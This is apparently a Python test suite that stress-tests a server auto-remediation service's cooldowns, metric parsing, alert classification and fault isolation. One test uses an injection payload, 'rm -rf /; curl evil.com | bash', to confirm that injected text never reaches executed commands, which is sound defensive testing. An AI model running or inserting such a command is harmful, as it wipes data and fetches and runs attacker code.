"""
Empirical Adversarial & Stress Test Suite for Milestone 3:
Proactive Action Execution & Auto-Remediation (R3).

Author: Empirical Challenger 1 (teamwork_preview_challenger_28_m3_1)
Mission: Stress-test cooldown boundary conditions, burst alert throttling,
malformed/corrupted SSH metric outputs, ambiguous alert classification,
command injection resilience, and fault isolation in the scan loop.
"""

import asyncio
from datetime import datetime, timezone, timedelta
from typing import Optional
import unittest
from unittest.mock import AsyncMock, MagicMock, patch

from app.services.proactive_service import (
    ProactiveIntelligenceService,
    _REMEDIATION_COOLDOWN_SECONDS,
)
from app.core.brain_core import ArtificialBrain


def _create_mock_service(
    mock_ssh: Optional[MagicMock] = None,
    mock_memory: Optional[MagicMock] = None,
    mock_telegram: Optional[MagicMock] = None,
) -> ProactiveIntelligenceService:
    ssh = mock_ssh or MagicMock()
    ssh.run_command = AsyncMock(return_value="")

    mem = mock_memory or MagicMock()
    mem.record_episode = AsyncMock()
    mem.should_send_proactive_alert = AsyncMock(return_value=True)
    mem.upsert_proactive_check = AsyncMock()

    tg = mock_telegram or MagicMock()
    tg.chat_id = "test_chat_challenger"
    tg.send_message = AsyncMock(return_value=True)

    return ProactiveIntelligenceService(
        ssh_client=ssh,
        memory_service=mem,
        telegram_bot=tg,
        scan_interval=3600,
    )


class TestChallengerM3AdversarialRemediation(unittest.IsolatedAsyncioTestCase):
    """Adversarial stress harness for Proactive Self-Healing & Remediation Engine."""

    async def asyncSetUp(self) -> None:
        self.addCleanup(ArtificialBrain.reset_instance)

    # ──────────────────────────────────────────────────────────────────────────
    # 1. Cooldown Boundary & Burst Alert Throttling
    # ──────────────────────────────────────────────────────────────────────────

    async def test_adv_01_cooldown_subsecond_boundary(self) -> None:
        """
        Adversarial Test 1: Sub-second boundary verification.
        - t = 1799.9s (0.1s before expiry) -> MUST be blocked.
        - t = 1800.1s (0.1s after expiry) -> MUST be allowed.
        """
        service = _create_mock_service()
        service._ssh.run_command = AsyncMock(return_value="80% 5G 35G")

        remediation = {
            "action_key": "docker_prune",
            "tier": 1,
            "command": "docker system prune -f",
            "metric_type": "disk",
            "auto_execute": True,
            "description": "Prune docker",
        }

        now = datetime.now(timezone.utc)

        # Case A: 1799.9 seconds ago (cooldown still active by 0.1s)
        service._remediation_cooldowns["docker_prune"] = now - timedelta(seconds=1799.9)
        blocked = await service._execute_remediation(remediation, "Disk full")
        self.assertFalse(blocked, "Execution at 1799.9s should be blocked by cooldown")

        # Case B: 1800.1 seconds ago (cooldown expired by 0.1s)
        service._remediation_cooldowns["docker_prune"] = now - timedelta(seconds=1800.1)
        allowed = await service._execute_remediation(remediation, "Disk full")
        self.assertTrue(allowed, "Execution at 1800.1s should be allowed")

    async def test_adv_02_cooldown_time_travel_drift(self) -> None:
        """
        Adversarial Test 2: System clock backward drift.
        If last_run timestamp is in the future (due to NTP sync step backwards),
        the system must safely block and not crash.
        """
        service = _create_mock_service()
        remediation = {
            "action_key": "drop_caches",
            "tier": 1,
            "command": "sync && echo 3 > /proc/sys/vm/drop_caches",
            "metric_type": "ram",
            "auto_execute": True,
        }

        # Last run simulated in future (+300s) due to clock rollback
        future_time = datetime.now(timezone.utc) + timedelta(seconds=300)
        service._remediation_cooldowns["drop_caches"] = future_time

        res = await service._execute_remediation(remediation, "RAM alert")
        # (now - last_run).total_seconds() is negative (-300) < 1800 -> blocked
        self.assertFalse(res, "Future timestamp due to clock drift must block execution safely")

    async def test_adv_03_cooldown_burst_100_sequential_alerts(self) -> None:
        """
        Adversarial Test 3: Burst of 100 sequential alerts for the same issue.
        Verifies that only the first alert triggers the SSH command,
        and subsequent 99 alerts are throttled without degrading performance or crashing.
        """
        service = _create_mock_service()
        service._ssh.run_command = AsyncMock(side_effect=[
            "90% 2G 35G",  # before metric
            "Deleted ...",  # command
            "70% 10G 35G", # after metric
        ])

        remediation = {
            "action_key": "docker_prune",
            "tier": 1,
            "command": "docker system prune -f",
            "metric_type": "disk",
            "auto_execute": True,
            "description": "Prune docker",
        }

        results = []
        for i in range(100):
            res = await service._execute_remediation(remediation, f"Alert #{i}")
            results.append(res)

        self.assertTrue(results[0], "First execution must succeed")
        self.assertEqual(results.count(True), 1, "Exactly 1 execution should succeed")
        self.assertEqual(results.count(False), 99, "99 executions must be throttled by cooldown")
        # SSH command should be called 3 times total (before, prune, after for the 1st execution only)
        self.assertEqual(service._ssh.run_command.call_count, 3)

    async def test_adv_04_cooldown_multi_action_isolation(self) -> None:
        """
        Adversarial Test 4: Verify independent cooldown counters per action key.
        docker_prune, drop_caches, and cleanup_logs should each execute once,
        unaffected by each other's cooldown state.
        """
        service = _create_mock_service()
        service._ssh.run_command = AsyncMock(return_value="1000 1000 2000")

        actions = [
            {"action_key": "docker_prune", "tier": 1, "command": "docker system prune -f", "auto_execute": True, "metric_type": "disk"},
            {"action_key": "drop_caches", "tier": 1, "command": "sync && echo 3 > /proc/sys/vm/drop_caches", "auto_execute": True, "metric_type": "ram"},
            {"action_key": "cleanup_logs", "tier": 1, "command": "journalctl --vacuum-time=3d", "auto_execute": True, "metric_type": "disk"},
        ]

        # Execute all 3 once -> All 3 must succeed
        for act in actions:
            res = await service._execute_remediation(act, "Initial alert")
            self.assertTrue(res, f"Action {act['action_key']} should succeed initially")

        # Execute all 3 again immediately -> All 3 must be blocked
        for act in actions:
            res = await service._execute_remediation(act, "Immediate retry alert")
            self.assertFalse(res, f"Action {act['action_key']} should be blocked on immediate retry")

    # ──────────────────────────────────────────────────────────────────────────
    # 2. Hostile, Malformed, and Edge-Case SSH Metric Outputs
    # ──────────────────────────────────────────────────────────────────────────

    async def test_adv_05_metric_snapshot_empty_or_whitespace_ssh_output(self) -> None:
        """
        Adversarial Test 5: SSH returns empty string or whitespace for disk and ram.
        Must return default snapshot dict without KeyError/IndexError.
        """
        service = _create_mock_service()
        service._ssh.run_command = AsyncMock(return_value="   \n\t  ")

        disk_snap = await service._get_metric_snapshot("disk")
        self.assertEqual(disk_snap["used_pct"], 0.0)
        self.assertEqual(disk_snap["free_gb"], 0.0)

        ram_snap = await service._get_metric_snapshot("ram")
        self.assertEqual(ram_snap["used_pct"], 0.0)
        self.assertEqual(ram_snap["free_gb"], 0.0)

    async def test_adv_06_metric_snapshot_corrupted_df_output(self) -> None:
        """
        Adversarial Test 6: Hostile/corrupted output from `df -h /`.
        Scenarios:
        - Permission denied
        - Non-numeric percentage: "ERR% 4G 35G"
        - Malformed columns
        """
        service = _create_mock_service()

        corrupted_outputs = [
            "df: /: Permission denied",
            "Filesystem 1K-blocks Used Available Use% Mounted on",
            "ERR% 4G 35G",
            "??? ??? ???",
            "99999999999% 9999G 9999G",
        ]

        for out in corrupted_outputs:
            service._ssh.run_command = AsyncMock(return_value=out)
            snap = await service._get_metric_snapshot("disk")
            self.assertIsInstance(snap, dict)
            self.assertIn("used_pct", snap)
            self.assertIn("free_gb", snap)

    async def test_adv_07_metric_snapshot_ram_zero_total_division_guard(self) -> None:
        """
        Adversarial Test 7: Division-by-zero protection in RAM metric parsing.
        When free -m reports `used=0 avail=0 total=0`.
        """
        service = _create_mock_service()
        service._ssh.run_command = AsyncMock(return_value="0 0 0")

        snap = await service._get_metric_snapshot("ram")
        self.assertEqual(snap["total_mb"], 0.0)
        # Should not raise ZeroDivisionError due to max(total_mb, 1.0)
        self.assertEqual(snap["used_pct"], 0.0)

    async def test_adv_08_metric_negative_freed_gb_handling(self) -> None:
        """
        Adversarial Test 8: Free space decreases after remediation.
        (e.g., external process wrote a large file while prune was executing).
        Ensure report handles it without negative space claims or exceptions.
        """
        service = _create_mock_service()
        # Before: 80% used, 10G free
        # Command executed
        # After: 85% used, 8G free (freed_gb = -2.0, pct_diff = -5.0)
        service._ssh.run_command = AsyncMock(side_effect=[
            "80% 10G 50G",
            "Deleted containers...",
            "85% 8G 50G",
        ])

        remediation = {
            "action_key": "docker_prune",
            "tier": 1,
            "command": "docker system prune -f",
            "metric_type": "disk",
            "auto_execute": True,
            "description": "Prune docker",
        }

        success = await service._execute_remediation(remediation, "Disk alert")
        self.assertTrue(success)

        # Telegram message must indicate stable execution without negative bug
        sent_msg = service._tg.send_message.call_args[0][1]
        self.assertIn("Lệnh đã thực thi thành công, hệ thống đã ổn định.", sent_msg)
        self.assertNotIn("-2.0GB", sent_msg)

    async def test_adv_09_metric_unit_scaling(self) -> None:
        """
        Adversarial Test 9: Verify unit scaling for Megabytes (M) and Kilobytes (K).
        """
        service = _create_mock_service()

        # 1024M should convert to 1.0 GB
        service._ssh.run_command = AsyncMock(return_value="95% 1024M 30G")
        snap_m = await service._get_metric_snapshot("disk")
        self.assertEqual(snap_m["free_gb"], 1.0)

        # 1048576K should convert to 1.0 GB
        service._ssh.run_command = AsyncMock(return_value="95% 1048576K 30G")
        snap_k = await service._get_metric_snapshot("disk")
        self.assertEqual(snap_k["free_gb"], 1.0)

    # ──────────────────────────────────────────────────────────────────────────
    # 3. Adversarial Alert Strings & Decision Stress
    # ──────────────────────────────────────────────────────────────────────────

    def test_adv_10_ambiguous_swap_with_disk_thrashing(self) -> None:
        """
        Adversarial Test 10: Alert contains BOTH 'Disk Thrashing' and 'Swap cao'.
        Must resolve to drop_caches (Tier 1 RAM/Swap), NOT docker_prune.
        """
        service = _create_mock_service()
        alert = "⚠️ <b>Dung lượng Swap cao:</b> 750MB > 500MB (cảnh báo nguy cơ Disk Thrashing trên SSD)"
        decision = service._decide_remediation(alert)

        self.assertIsNotNone(decision)
        self.assertEqual(decision["action_key"], "drop_caches")
        self.assertEqual(decision["metric_type"], "ram")

    def test_adv_11_command_injection_attempt_in_alert(self) -> None:
        """
        Adversarial Test 11: Hostile injection payload inside alert string.
        Ensure _decide_remediation strictly maps to predefined hardcoded safe commands,
        and never passes injected bash fragments into the command string.
        """
        service = _create_mock_service()
        hostile_alert = "💽 Ổ đĩa sắp đầy; rm -rf /; curl evil.com | bash"
        decision = service._decide_remediation(hostile_alert)

        self.assertIsNotNone(decision)
        # Must be strictly the predefined command
        self.assertEqual(decision["command"], "docker system prune -f")
        self.assertNotIn("rm -rf", decision["command"])
        self.assertNotIn("curl", decision["command"])

    def test_adv_12_non_string_and_massive_alert_inputs(self) -> None:
        """
        Adversarial Test 12: Extreme alert inputs:
        - None, numbers, booleans, nested dictionaries.
        - Massive 100KB string to check for catastrophic regex backtracking or memory issues.
        """
        service = _create_mock_service()

        self.assertIsNone(service._decide_remediation(None))
        self.assertIsNone(service._decide_remediation(12345))
        self.assertIsNone(service._decide_remediation(True))
        self.assertIsNone(service._decide_remediation([]))

        # Nested dict with no recognizable text
        self.assertIsNone(service._decide_remediation({"key": "value"}))

        # Nested dict with disk text
        dict_decision = service._decide_remediation({"text": "Phân vùng root sắp đầy 95%"})
        self.assertIsNotNone(dict_decision)
        self.assertEqual(dict_decision["action_key"], "docker_prune")

        # 100KB long string
        huge_alert = ("vấn đề hệ thống " * 5000) + "ổ đĩa sắp đầy"
        huge_decision = service._decide_remediation(huge_alert)
        self.assertIsNotNone(huge_decision)
        self.assertEqual(huge_decision["action_key"], "docker_prune")

    # ──────────────────────────────────────────────────────────────────────────
    # 4. Extreme Fault Isolation & Scan Cycle Resilience
    # ──────────────────────────────────────────────────────────────────────────

    async def test_adv_13_scan_cycle_partial_check_hang_or_crash(self) -> None:
        """
        Adversarial Test 13: 4 out of 9 SRE checks throw severe exceptions (Timeout, ConnectionReset).
        The scan cycle must not crash, and valid checks (e.g. disk alert) must still
        trigger safe auto-remediation cleanly.
        """
        service = _create_mock_service()

        disk_alert = "💽 <b>Ổ đĩa sắp đầy:</b>\n  <code>/dev/sda1</code>: 92%"

        with patch.object(service, "_check_disk", AsyncMock(return_value=disk_alert)), \
             patch.object(service, "_check_memory", AsyncMock(side_effect=TimeoutError("SSH timeout"))), \
             patch.object(service, "_check_ssl_certs", AsyncMock(side_effect=ConnectionResetError("Reset"))), \
             patch.object(service, "_check_oom_kills", AsyncMock(return_value="")), \
             patch.object(service, "_check_container_restarts", AsyncMock(side_effect=RuntimeError("Docker daemon hung"))), \
             patch.object(service, "_check_cpu_load", AsyncMock(return_value="")), \
             patch.object(service, "_check_swap", AsyncMock(side_effect=OSError("Pipe broken"))), \
             patch.object(service, "_check_root_disk", AsyncMock(return_value="")), \
             patch.object(service, "_check_core_containers", AsyncMock(return_value="")), \
             patch.object(service, "_execute_remediation", AsyncMock(return_value=True)) as mock_exec:

            # Must run to completion without raising exception
            await service._run_scan_cycle()

            # The 1 valid alert was remediated
            self.assertEqual(mock_exec.call_count, 1)
            # Telegram notification dispatched
            service._tg.send_message.assert_called_once()

    async def test_adv_14_telegram_outage_does_not_crash_scan_cycle(self) -> None:
        """
        Adversarial Test 14: Complete Telegram API outage (HTTP 500, timeout).
        _execute_remediation and _run_scan_cycle must safely catch and continue.
        """
        service = _create_mock_service()
        service._tg.send_message = AsyncMock(side_effect=RuntimeError("Telegram API 500 Internal Server Error"))
        service._ssh.run_command = AsyncMock(return_value="80% 5G 35G")

        remediation = {
            "action_key": "docker_prune",
            "tier": 1,
            "command": "docker system prune -f",
            "metric_type": "disk",
            "auto_execute": True,
        }

        # Should not raise exception
        success = await service._execute_remediation(remediation, "Disk alert")
        self.assertFalse(success)

    async def test_adv_15_brain_pulse_failure_does_not_block_remediation(self) -> None:
        """
        Adversarial Test 15: If ArtificialBrain.step_pulse or sleep consolidation raises,
        the scan cycle must still proceed with auto-remediation and alert dispatch.
        """
        service = _create_mock_service()
        disk_alert = "💽 <b>Ổ đĩa sắp đầy:</b> 95%"

        with patch.object(service, "_check_disk", AsyncMock(return_value=disk_alert)), \
             patch.object(service, "_check_memory", AsyncMock(return_value="")), \
             patch.object(service, "_check_ssl_certs", AsyncMock(return_value="")), \
             patch.object(service, "_check_oom_kills", AsyncMock(return_value="")), \
             patch.object(service, "_check_container_restarts", AsyncMock(return_value="")), \
             patch.object(service, "_check_cpu_load", AsyncMock(return_value="")), \
             patch.object(service, "_check_swap", AsyncMock(return_value="")), \
             patch.object(service, "_check_root_disk", AsyncMock(return_value="")), \
             patch.object(service, "_check_core_containers", AsyncMock(return_value="")), \
             patch("app.core.brain_core.ArtificialBrain.get_instance", side_effect=RuntimeError("Brain memory corruption")), \
             patch.object(service, "_execute_remediation", AsyncMock(return_value=True)) as mock_exec:

            await service._run_scan_cycle()
            self.assertEqual(mock_exec.call_count, 1)


if __name__ == "__main__":
    unittest.main()
